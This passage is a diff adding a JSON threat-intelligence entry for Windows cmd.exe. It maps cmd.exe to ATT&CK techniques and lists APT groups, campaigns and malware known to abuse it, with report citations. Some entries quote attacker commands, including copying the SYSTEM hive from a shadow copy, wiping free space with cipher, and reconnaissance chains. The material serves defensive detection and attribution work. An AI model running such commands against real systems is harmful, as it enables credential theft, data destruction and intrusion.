@@ -1,0 +1,2024 @@
+{
+  "type": "lolbin",
+  "version": 2,
+  "id": "19b1be51-1ebc-48ae-8c3c-9d56294fb459",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-16T00:15:00.000Z",
+  "modified": "2026-10-16T00:15:00.000Z",
+  "name": "CMD.exe",
+  "image": "cmd.exe",
+  "description": "cmd is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities.",
+  "attack": {
+    "id": "S0106",
+    "name": "cmd",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0106",
+    "version": "20.0"
+  },
+  "summary": [
+    "Copy files to/from a remotely connected internal system",
+    "Execute programs and other actions at the command-line interface",
+    "Find information about the operating system",
+    "Copy files to/from a remotely connected external system",
+    "Delete files from the file system",
+    "Find files and directories with native functionality such as dir commands"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\cmd.exe",
+    "C:\\Windows\\SysWOW64\\cmd.exe"
+  ],
+  "hashes": {
+    "MD5": "321A50053155122E6ACE9691197A8E3F"
+  },
+  "capabilities": [
+    "Execute",
+    "Alternate data streams",
+    "Download",
+    "Upload"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0008:Lateral Movement:T1570",
+    "TA0002:Execution:T1059.003",
+    "TA0007:Discovery:T1082",
+    "TA0011:Command and Control:T1105",
+    "TA0005:Stealth:T1070.004",
+    "TA0007:Discovery:T1083"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "Agrius",
+        "attack_id": "G1030",
+        "evidence": "names cmd.exe",
+        "description": "Agrius uses ASPXSpy web shells to enable follow-on command execution via cmd.exe.",
+        "sources": "SentinelOne Agrius 2021 https://assets.sentinelone.com/sentinellabs/evol-agrius"
+      },
+      {
+        "name": "APT18",
+        "attack_id": "G0026",
+        "evidence": "uses S0106; names cmd.exe",
+        "description": "APT18 uses cmd.exe to execute commands on the victim’s machine.",
+        "sources": "PaloAlto DNS Requests May 2016 https://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/; Anomali Evasive Maneuvers July 2015 https://www.anomali.com/blog/evasive-maneuvers-the-wekby-group-attempts-to-evade-analysis-via-custom-rop"
+      },
+      {
+        "name": "APT28",
+        "attack_id": "G0007",
+        "evidence": "names cmd.exe",
+        "description": "An APT28 loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.",
+        "sources": "Accenture SNAKEMACKEREL Nov 2018 https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50; Unit42 Cannon Nov 2018 https://researchcenter.paloaltonetworks.com/2018/11/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/; TrendMicro Pawn Storm Dec 2020 https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html; Talos Seduploader Oct 2017 https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html; Unit 42 Playbook Dec 2017 https://web.archive.org/web/20230702043312/https://pan-unit42.github.io/playbook_viewer/"
+      },
+      {
+        "name": "APT3",
+        "attack_id": "G0022",
+        "evidence": "names cmd.exe",
+        "description": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers. An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of “System.”",
+        "sources": "FireEye Operation Double Tap https://www.fireeye.com/blog/threat-research/2014/11/operation_doubletap.html; Symantec Buckeye https://web.archive.org/web/20160910124439/http://www.symantec.com/connect/blogs/buckeye-cyberespionage-group-shifts-gaze-us-hong-kong"
+      },
+      {
+        "name": "APT32",
+        "attack_id": "G0050",
+        "evidence": "names cmd.exe",
+        "description": "APT32 has used cmd.exe for execution.",
+        "sources": "Cybereason Cobalt Kitty 2017 https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": "names cmd.exe",
+        "description": "APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine. Additionally, APT38 has used batch scripts. APT38 has also executed scripts to launch `cmd.exe` to POST stolen data to actor-controlled domains.",
+        "sources": "FireEye APT38 Oct 2018 https://services.google.com/fh/files/misc/apt38-un-usual-suspects.pdf; Microsoft Axios Compromise APR 2026 https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/; MIcrosoft Mastra npm Compromise JUN 2026 https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/; 1 - appv https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": "names cmd.exe",
+        "description": "APT41 used cmd.exe /c to execute commands on remote machines. APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.",
+        "sources": "FireEye APT41 Aug 2019 https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf; FireEye APT41 March 2020 https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+      },
+      {
+        "name": "APT5",
+        "attack_id": "G1023",
+        "evidence": "names cmd.exe",
+        "description": "APT5 has used cmd.exe for execution on compromised systems.",
+        "sources": "Mandiant Pulse Secure Update May 2021 https://www.mandiant.com/resources/blog/updates-on-chinese-apt-compromising-pulse-secure-vpn-devices"
+      },
+      {
+        "name": "BRONZE BUTLER",
+        "attack_id": "G0060",
+        "evidence": "uses S0106"
+      },
+      {
+        "name": "Cobalt Group",
+        "attack_id": "G0080",
+        "evidence": "names cmd.exe",
+        "description": "Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches.bat files.",
+        "sources": "Morphisec Cobalt Gang Oct 2018 https://blog.morphisec.com/cobalt-gang-2.0; Talos Cobalt Group July 2018 https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html; PTSecurity Cobalt Group Aug 2017 https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-2017-eng.pdf; Group IB Cobalt Aug 2017 https://www.group-ib.com/blog/cobalt; Unit 42 Cobalt Gang Oct 2018 https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/; TrendMicro Cobalt Group Nov 2017 https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/"
+      },
+      {
+        "name": "Contagious Interview",
+        "attack_id": "G1052",
+        "evidence": "names cmd.exe",
+        "description": "Contagious Interview has utilized VBS scripts to open cmd.exe and run commands to include the go_batch.bat batch file.",
+        "sources": "Sekoia ClickFake 2025 https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+      },
+      {
+        "name": "FIN7",
+        "attack_id": "G0046",
+        "evidence": "names cmd.exe",
+        "description": "FIN7 has used the command `cmd.exe /C quser` to collect user session information. FIN7 used the command prompt to launch commands on the victim’s machine. Additionally, FIN7 has used cmd.exe to open the Run dialog by sending the “Windows + R” keys through malicious USBs acting as virtual keyboards.",
+        "sources": "Mandiant FIN7 Apr 2022 https://www.mandiant.com/resources/evolution-of-fin7; FireEye FIN7 Aug 2018 https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html; Gemini_FIN7_Jan2022 https://geminiadvisory.io/fin7-flash-drives-spread-remote-access-trojan/; Flashpoint FIN 7 March 2019 https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/"
+      },
+      {
+        "name": "FIN8",
+        "attack_id": "G0061",
+        "evidence": "names cmd.exe",
+        "description": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn `cmd.exe` execution. FIN8 has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities. FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via `cmd.exe`.",
+        "sources": "FireEye Obfuscation June 2017 https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html; FireEye Know Your Enemy FIN8 Aug 2016 https://www2.fireeye.com/WBNR-Know-Your-Enemy-UNC622-Spear-Phishing.html; Bitdefender FIN8 July 2021 https://businessinsights.bitdefender.com/deep-dive-into-a-fin8-attack-a-forensic-investigation; Symantec FIN8 Jul 2023 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/syssphinx-fin8-backdoor"
+      },
+      {
+        "name": "Fox Kitten",
+        "attack_id": "G0117",
+        "evidence": "names cmd.exe",
+        "description": "Fox Kitten has used cmd.exe likely as a password changing mechanism.",
+        "sources": "CISA AA20-259A Iran-Based Actor September 2020 https://us-cert.cisa.gov/ncas/alerts/aa20-259a"
+      },
+      {
+        "name": "GALLIUM",
+        "attack_id": "G0093",
+        "evidence": "uses S0106; names cmd.exe",
+        "description": "GALLIUM used a renamed cmd.exe file to evade detection. GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.",
+        "sources": "Cybereason Soft Cell June 2019 https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers; Microsoft GALLIUM December 2019 https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/"
+      },
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": "names cmd.exe",
+        "description": "Gamaredon Group has tested connectivity between a compromised machine and a C2 server using Ping with commands such as `CSIDL_SYSTEM\\cmd.exe /c ping -n 1`. Gamaredon Group has searched the ping records to obtain the C2 address and has used ping to search for the C2’s status.",
+        "sources": "Symantec Shuckworm January 2022 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine; SymantecCarbonBlack_ShuckwormUSB_Apr2025 https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "name": "Gorgon Group",
+        "attack_id": "G0078",
+        "evidence": "names cmd.exe",
+        "description": "Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system.",
+        "sources": "Unit 42 Gorgon Group Aug 2018 https://researchcenter.paloaltonetworks.com/2018/08/unit42-gorgon-group-slithering-nation-state-cybercrime/"
+      },
+      {
+        "name": "HAFNIUM",
+        "attack_id": "G0125",
+        "evidence": "names cmd.exe",
+        "description": "HAFNIUM has used `cmd.exe` to execute commands on the victim's machine.",
+        "sources": "Rapid7 HAFNIUM Mar 2021 https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "name": "Higaisa",
+        "attack_id": "G0126",
+        "evidence": "names cmd.exe",
+        "description": "Higaisa used cmd.exe for execution.",
+        "sources": "Malwarebytes Higaisa 2020 https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/; Zscaler Higaisa 2020 https://www.zscaler.com/blogs/security-research/return-higaisa-apt; PTSecurity Higaisa 2020 https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/"
+      },
+      {
+        "name": "INC Ransom",
+        "attack_id": "G1032",
+        "evidence": "names cmd.exe",
+        "description": "INC Ransom has used `cmd.exe` to launch malicious payloads.",
+        "sources": "Huntress INC Ransom Group August 2023 https://www.huntress.com/blog/investigating-new-inc-ransom-group-activity"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "names cmd.exe",
+        "description": "Kimsuky has executed Windows commands by using `cmd` and running batch scripts. Kimsuky has also used `cmd.exe` to automatically open downloaded decoy pdf documents with the system’s default PDF viewer. Kimsuky has utilized malicious payloads to create reverse shells within the victim environment. Kimsuky has also used batch scripts to eventually run QuasarRAT.",
+        "sources": "Gen Digital Kimsuky HTTPTroy October 2025 https://www.gendigital.com/blog/insights/research/dprk-kimsuky-lazarus-analysis; Talos Kimsuky Nov 2021 https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html; KISA Operation Muzabi https://web.archive.org/web/20220328121326/https://boho.or.kr/filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf; NaumaanProofpoint_GlobalClickFix_April2025 https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix; Aryaka Kimsuky July 2025 https://www.aryaka.com/docs/reports/aryaka-kimsuky-apt-operational-blueprint.pdf"
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": "names cmd.exe",
+        "description": "Lazarus Group malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.",
+        "sources": "Novetta Blockbuster Destructive Malware https://web.archive.org/web/20160303200515/https:/operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf; Novetta Blockbuster https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf; Qualys LolZarus https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns; McAfee Lazarus Resurfaces Feb 2018 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/; McAfee GhostSecret https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/; US-CERT SHARPKNOT June 2018 https://www.us-cert.gov/sites/default/files/publications/MAR-10135536.11.WHITE.pdf"
+      },
+      {
+        "name": "Medusa Group",
+        "attack_id": "G1051",
+        "evidence": "names cmd.exe",
+        "description": "Medusa Group has identified network shares using `cmd.exe /c net share`. Medusa Group has leveraged `cmd.exe` to identify system info `cmd.exe /c systeminfo`. Medusa Group has obtained host network details utilizing the command `cmd.exe /c ipconfig /all`.",
+        "sources": "CISA Medusa Group Medusa Ransomware March 2025 https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "name": "menuPass",
+        "attack_id": "G0045",
+        "evidence": "uses S0106"
+      },
+      {
+        "name": "MirrorFace",
+        "attack_id": "G1054",
+        "evidence": "names cmd.exe",
+        "description": "MirrorFace has used `cmd.exe` for malware execution, file discovery, and manual file manipulation.",
+        "sources": "Trend Micro Earth Kasha Updates APR 2025 https://www.trendmicro.com/en_us/research/25/d/earth-kasha-updates-ttps.html; JPCERT MirrorFace JUL 2024 https://blogs.jpcert.or.jp/en/2024/07/mirrorface-attack-against-japanese-organisations.html; Trend Micro Earth Kasha NOV 2024 https://www.trendmicro.com/en_us/research/24/k/lodeinfo-campaign-of-earth-kasha.html"
+      },
+      {
+        "name": "MuddyWater",
+        "attack_id": "G0069",
+        "evidence": "names cmd.exe",
+        "description": "MuddyWater has used cmd.exe net user /domain to enumerate domain users.",
+        "sources": "Trend Micro Muddy Water March 2021 https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html"
+      },
+      {
+        "name": "Mustang Panda",
+        "attack_id": "G0129",
+        "evidence": "names cmd.exe",
+        "description": "Mustang Panda has utilized TCP-based reverse shells using cmd.exe. Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection. Mustang Panda has also utilized cmd.exe to execute commands on an infected host such as `cmd.exe /c ping.exe 8.8.8.8 -n 70&&\"%temp%\\FontEDL.exe\"`.",
+        "sources": "Cisco Talos MUSTANG PANDA PLUGX PUBLOAD MAY 2022 https://blog.talosintelligence.com/mustang-panda-targets-europe/; Anomali MUSTANG PANDA October 2019 https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations; Avira Mustang Panda January 2020 https://www.avira.com/en/blog/new-wave-of-plugx-targets-hong-kong"
+      },
+      {
+        "name": "Nomadic Octopus",
+        "attack_id": "G0133",
+        "evidence": "names cmd.exe",
+        "description": "Nomadic Octopus used cmd.exe /c within a malicious macro.",
+        "sources": "ESET Nomadic Octopus 2018 https://www.virusbulletin.com/uploads/pdf/conference_slides/2018/Cherepanov-VB2018-Octopus.pdf"
+      },
+      {
+        "name": "Orangeworm",
+        "attack_id": "G0071",
+        "evidence": "uses S0106"
+      },
+      {
+        "name": "Rancor",
+        "attack_id": "G0075",
+        "evidence": "names cmd.exe",
+        "description": "Rancor has used cmd.exe to execute commmands.",
+        "sources": "Rancor Unit42 June 2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "name": "TA505",
+        "attack_id": "G0092",
+        "evidence": "names cmd.exe",
+        "description": "TA505 has executed commands using cmd.exe.",
+        "sources": "Trend Micro TA505 June 2019 https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+      },
+      {
+        "name": "TA551",
+        "attack_id": "G0127",
+        "evidence": "names cmd.exe",
+        "description": "TA551 has used cmd.exe to execute commands.",
+        "sources": "Unit 42 TA551 Jan 2021 https://unit42.paloaltonetworks.com/ta551-shathak-icedid/"
+      },
+      {
+        "name": "Turla",
+        "attack_id": "G0010",
+        "evidence": "names cmd.exe",
+        "description": "Turla RPC backdoors have used cmd.exe to execute commands.",
+        "sources": "ESET Turla PowerShell May 2019 https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/; Symantec Waterbug Jun 2019 https://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments"
+      },
+      {
+        "name": "VOID MANTICORE",
+        "attack_id": "G1055",
+        "evidence": "names cmd.exe",
+        "description": "VOID MANTICORE has utilized WMIC to log into the victim host and create a process `process call create “cmd.exe /c copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system c:\\users\\public”`.",
+        "sources": "Check Point VOID MANTICORE Handala Hack March 2026 https://research.checkpoint.com/2026/handala-hack-unveiling-groups-modus-operandi/"
+      },
+      {
+        "name": "Volt Typhoon",
+        "attack_id": "G1017",
+        "evidence": "uses S0106"
+      },
+      {
+        "name": "Wizard Spider",
+        "attack_id": "G0102",
+        "evidence": "names cmd.exe",
+        "description": "Wizard Spider has used `cmd.exe` to execute commands on a victim's machine.",
+        "sources": "Mandiant FIN12 Oct 2021 https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf; DFIR Ryuk's Return October 2020 https://thedfirreport.com/2020/10/08/ryuks-return/"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "2025 Poland Wiper Attacks",
+        "attack_id": "C0063",
+        "evidence": "names cmd.exe",
+        "description": "During the 2025 Poland Wiper Attacks, the adversaries used Tasklist for reconnaissance activities running `cmd.exe /c \"tasklist > C:\\Windows\\TEMP\\outlog.txt && netstat -nao >> C:\\Windows\\TEMP\\outlog.txt && netstat -r >> C:\\Windows\\TEMP\\ outlog.txt && arp -a >> C:\\Windows\\TEMP\\outlog.txt && dir /s /b C:\\ Users >> C:\\Windows\\TEMP\\outlog.txt`. During the 2025 Poland Wiper Attacks, the adversaries leveraged PsExec to run `cmd.exe` commands on multiple victim machines.",
+        "sources": "CERT Polska https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf"
+      },
+      {
+        "name": "APT28 Nearest Neighbor Campaign",
+        "attack_id": "C0051",
+        "evidence": "names cmd.exe",
+        "description": "During APT28 Nearest Neighbor Campaign, APT28 used the native Microsoft utility cipher.exe to securely wipe files and folders – overwriting the deleted data using cmd.exe /c cipher /W:C. During APT28 Nearest Neighbor Campaign, APT28 used cmd.exe for execution.",
+        "sources": "Nearest Neighbor Volexity https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "name": "C0015",
+        "attack_id": "C0015",
+        "evidence": "names cmd.exe",
+        "description": "During C0015, the threat actors used `cmd.exe` to execute commands and run malicious binaries.",
+        "sources": "DFIR Conti Bazar Nov 2021 https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/"
+      },
+      {
+        "name": "C0017",
+        "attack_id": "C0017",
+        "evidence": "names cmd.exe",
+        "description": "During C0017, APT41 used `cmd.exe` to execute reconnaissance commands. During C0017, APT41 used `cmd.exe /c ping %userdomain%` for discovery.",
+        "sources": "Mandiant APT41 https://www.mandiant.com/resources/apt41-us-state-governments"
+      },
+      {
+        "name": "FunnyDream",
+        "attack_id": "C0007",
+        "evidence": "names cmd.exe",
+        "description": "During FunnyDream, the threat actors used `cmd.exe` to execute the wmiexec.vbs script.",
+        "sources": "Bitdefender FunnyDream Campaign November 2020 https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "name": "Operation AkaiRyū",
+        "attack_id": "C0060",
+        "evidence": "names cmd.exe",
+        "description": "During Operation AkaiRyū, MirrorFace used `cmd.exe` to run PowerShell commands to drop additional files on the compromised host.",
+        "sources": "ESET MirrorFace 2025 https://www.welivesecurity.com/en/eset-research/operation-akairyu-mirrorface-invites-europe-expo-2025-revives-anel-backdoor/"
+      },
+      {
+        "name": "Operation Digital Eye",
+        "attack_id": "C0061",
+        "evidence": "names cmd.exe",
+        "description": "During Operation Digital Eye, threat actors used `cmd.exe` as a default method of execution for a custom version of Mimikatz named bK2o.exe.",
+        "sources": "sentinelone operationDigitalEye Dec 2024 https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/"
+      },
+      {
+        "name": "Operation Honeybee",
+        "attack_id": "C0006",
+        "evidence": "uses S0106; names cmd.exe",
+        "description": "During Operation Honeybee, various implants used batch scripting and `cmd.exe` for execution.",
+        "sources": "McAfee Honeybee https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-uncovers-operation-honeybee-malicious-document-campaign-targeting-humanitarian-aid-groups/"
+      },
+      {
+        "name": "Operation Wocao",
+        "attack_id": "C0014",
+        "evidence": "names cmd.exe",
+        "description": "During Operation Wocao, threat actors spawned a new `cmd.exe` process to execute commands.",
+        "sources": "FoxIT Wocao December 2019 https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "name": "SharePoint ToolShell Exploitation",
+        "attack_id": "C0058",
+        "evidence": "names cmd.exe",
+        "description": "During SharePoint ToolShell Exploitation, threat actors utilized `cmd.exe` and batch scripts within the victim environment.",
+        "sources": "ESET ToolShell JUL 2025 https://www.welivesecurity.com/en/eset-research/toolshell-an-all-you-can-eat-buffet-for-threat-actors/; Eye Research ToolShell JUL 2025 https://research.eye.security/sharepoint-under-siege/; SentinelOne ToolShell JUL 2025 https://www.sentinelone.com/blog/sharepoint-toolshell-zero-day-exploited-in-the-wild-targets-enterprise-servers/; Microsoft SharePoint Exploit JUL 2025 https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/#storm-2603"
+      },
+      {
+        "name": "SolarWinds Compromise",
+        "attack_id": "C0024",
+        "evidence": "names cmd.exe",
+        "description": "During the SolarWinds Compromise, APT29 used `cmd.exe` to execute commands on remote machines.",
+        "sources": "Volexity SolarWinds https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/; Microsoft Analyzing Solorigate Dec 2020 https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/"
+      },
+      {
+        "name": "Water Curupira Pikabot Distribution",
+        "attack_id": "C0037",
+        "evidence": "names cmd.exe",
+        "description": "Water Curupira Pikabot Distribution installation via JavaScript will launch follow-on commands via cmd.exe.",
+        "sources": "TrendMicro Pikabot 2024 https://www.trendmicro.com/en_us/research/24/a/a-look-into-pikabot-spam-wave-campaign.html"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "ABK",
+        "attack_id": "S0469",
+        "evidence": "names cmd.exe",
+        "description": "ABK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.",
+        "sources": "Trend Micro Tick November 2019 https://documents.trendmicro.com/assets/pdf/Operation-ENDTRADE-TICK-s-Multi-Stage-Backdoors-for-Attacking-Industries-and-Stealing-Classified-Data.pdf"
+      },
+      {
+        "name": "Action RAT",
+        "attack_id": "S1028",
+        "evidence": "names cmd.exe",
+        "description": "Action RAT can identify AV products on an infected host using the following command: `cmd.exe WMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`. Action RAT can use `cmd.exe` to execute commands on an infected host.",
+        "sources": "MalwareBytes SideCopy Dec 2021 https://www.malwarebytes.com/blog/news/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure"
+      },
+      {
+        "name": "adbupd",
+        "attack_id": "S0202",
+        "evidence": "names cmd.exe",
+        "description": "adbupd can run a copy of cmd.exe.",
+        "sources": "Microsoft PLATINUM April 2016 https://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum%20feature%20article%20-%20Targeted%20attacks%20in%20South%20and%20Southeast%20Asia%20April%202016.pdf"
+      },
+      {
+        "name": "Anchor",
+        "attack_id": "S0504",
+        "evidence": "names cmd.exe",
+        "description": "Anchor has used cmd.exe to run its self deletion routine.",
+        "sources": "Cyberreason Anchor December 2019 https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+      },
+      {
+        "name": "AuTo Stealer",
+        "attack_id": "S1029",
+        "evidence": "names cmd.exe",
+        "description": "AuTo Stealer can use `cmd.exe` to execute a created batch file.",
+        "sources": "MalwareBytes SideCopy Dec 2021 https://www.malwarebytes.com/blog/news/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure"
+      },
+      {
+        "name": "BabyShark",
+        "attack_id": "S0414",
+        "evidence": "names cmd.exe",
+        "description": "BabyShark has used cmd.exe to execute commands.",
+        "sources": "Unit42 BabyShark Feb 2019 https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/"
+      },
+      {
+        "name": "BADHATCH",
+        "attack_id": "S1081",
+        "evidence": "names cmd.exe",
+        "description": "BADHATCH can use `cmd.exe` to execute commands on a compromised host.",
+        "sources": "Gigamon BADHATCH Jul 2019 https://blog.gigamon.com/2019/07/23/abadbabe-8badf00d-discovering-badhatch-and-a-detailed-look-at-fin8s-tooling/; BitDefender BADHATCH Mar 2021 https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
+      },
+      {
+        "name": "BADNEWS",
+        "attack_id": "S0128",
+        "evidence": "names cmd.exe",
+        "description": "BADNEWS is capable of executing commands via cmd.exe.",
+        "sources": "Forcepoint Monsoon https://www.forcepoint.com/sites/default/files/resources/files/forcepoint-security-labs-monsoon-analysis-report.pdf; TrendMicro Patchwork Dec 2017 https://documents.trendmicro.com/assets/tech-brief-untangling-the-patchwork-cyberespionage-group.pdf"
+      },
+      {
+        "name": "Bazar",
+        "attack_id": "S0534",
+        "evidence": "names cmd.exe",
+        "description": "Bazar can launch cmd.exe to perform reconnaissance commands.",
+        "sources": "Cybereason Bazar July 2020 https://www.cybereason.com/blog/a-bazar-of-tricks-following-team9s-development-cycles; Zscaler Bazar September 2020 https://www.zscaler.com/blogs/research/spear-phishing-campaign-delivers-buer-and-bazar-malware"
+      },
+      {
+        "name": "BBK",
+        "attack_id": "S0470",
+        "evidence": "names cmd.exe",
+        "description": "BBK has the ability to use the CreatePipe API to add a sub-process for execution via cmd. BBK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.",
+        "sources": "Trend Micro Tick November 2019 https://documents.trendmicro.com/assets/pdf/Operation-ENDTRADE-TICK-s-Multi-Stage-Backdoors-for-Attacking-Industries-and-Stealing-Classified-Data.pdf"
+      },
+      {
+        "name": "Bisonal",
+        "attack_id": "S0268",
+        "evidence": "names cmd.exe",
+        "description": "Bisonal has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.",
+        "sources": "Unit 42 Bisonal July 2018 https://researchcenter.paloaltonetworks.com/2018/07/unit42-bisonal-malware-used-attacks-russia-south-korea/; Kaspersky CactusPete Aug 2020 https://securelist.com/cactuspete-apt-groups-updated-bisonal-backdoor/97962/; Talos Bisonal Mar 2020 https://blog.talosintelligence.com/2020/03/bisonal-10-years-of-play.html"
+      },
+      {
+        "name": "Black Basta",
+        "attack_id": "S1070",
+        "evidence": "names cmd.exe",
+        "description": "Black Basta can use `cmd.exe` to enable shadow copy deletion.",
+        "sources": "Deep Instinct Black Basta August 2022 https://www.deepinstinct.com/blog/black-basta-ransomware-threat-emergence"
+      },
+      {
+        "name": "BlackCat",
+        "attack_id": "S1068",
+        "evidence": "names cmd.exe",
+        "description": "BlackCat can execute commands on a compromised network with the use of `cmd.exe`.",
+        "sources": "Microsoft BlackCat Jun 2022 https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/"
+      },
+      {
+        "name": "BlackMould",
+        "attack_id": "S0564",
+        "evidence": "names cmd.exe",
+        "description": "BlackMould can run cmd.exe with parameters.",
